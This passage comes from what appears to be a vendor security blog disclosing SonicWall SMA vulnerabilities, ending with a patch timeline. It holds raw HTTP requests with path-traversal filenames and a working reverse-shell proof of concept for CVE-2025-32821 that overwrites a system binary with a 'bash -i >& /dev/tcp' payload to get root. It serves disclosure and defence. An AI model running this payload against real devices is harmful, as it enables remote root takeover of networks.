    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i
    Connection: keep-alive
    Content-Length: 181
    
    ------WebKitFormBoundaryIpPybfdplJ1hIwzq
    Content-Disposition: form-data; name="upfile"; filename="../../../../../../../../../bin/"
    
    01
    ------WebKitFormBoundaryIpPybfdplJ1hIwzq--
    

Lastly, we’ll set our sights on remote code execution as root by exploiting CVE-2025-32821. We throw the reverse shell PoC below at our victim and it responds with a 200 code and “success” in the body. Note that a hash symbol is also appended to our executable file contents; this is added because the file write occasionally seems to append a junk character to our command, though it doesn’t happen every time. In order to avoid any unexpected additions, we escape the rest of the line.
    
    
    POST /cgi-bin/importlogo HTTP/1.1
    Host: 192.168.181.150
    Cookie: swap="amZEMjA1cVYwNXRzWDFmcDgzcVhEb3NNM2hFMHE4a0FTOFZTQTlDeE1kaz0="; swcctn=bGhJ8EJ9GMmKG7d3MggEEgd8R59gyFSv
    Content-Length: 567
    Sec-Ch-Ua-Platform: "Windows"
    X-Csrf-Token: bGhJ8EJ9GMmKG7d3MggEEgd8R59gyFSv
    Accept-Language: en-US,en;q=0.9
    Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXOj6BtGNhEubdWvN
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Accept-Encoding: gzip, deflate, br
    Priority: u=1, i
    Connection: keep-alive
    
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="portalName"
    
    ../../../../../../bin/lsb_release #
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="defaultFavicon"
    
    0
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="updateFavicon"
    
    1
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="favicon1"; filename="TESTING.gif"
    Content-Type: image/gif
    
    bash -i >& /dev/tcp/192.168.181.129/4242 0>&1 #
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN--
    

One minute later, our reverse shell arrives and root-level remote code execution is confirmed.

![blog-sonicwall-12.png](https://www.rapid7.com/cdn/images/bltf4b3cfe57acf394d/68497f5976d324918738a514/blog-sonicwall-12.png)

## Disclosure timeline

  * **May 2, 2025:** Rapid7 shares vulnerability details with SonicWall security contacts. The SonicWall team acknowledges the disclosure 30 minutes later and confirms that patch development work will begin.
  * **May 4, 2025:** The SonicWall security team states that a fixed build will be shared on May 5 for patch validation.
  * **May 5, 2025:** The SonicWall security team shares the 10.2.1.15 build with Rapid7. The Rapid7 team validates that the patch is effective.
  * **May 6, 2025:** The SonicWall security team states that the patch will be targeting a May 7 release date.
  * **May 7, 2025:** SonicWall releases v10.2.1.15 and publishes a [security advisory](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0011). After confirming the patch is generally available, Rapid7 publishes this disclosure.



## Article tags

  * [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/)
  * [Vulnerability Management](/blog/tag/vulnerability-management/)
  * [Research](/blog/tag/research/)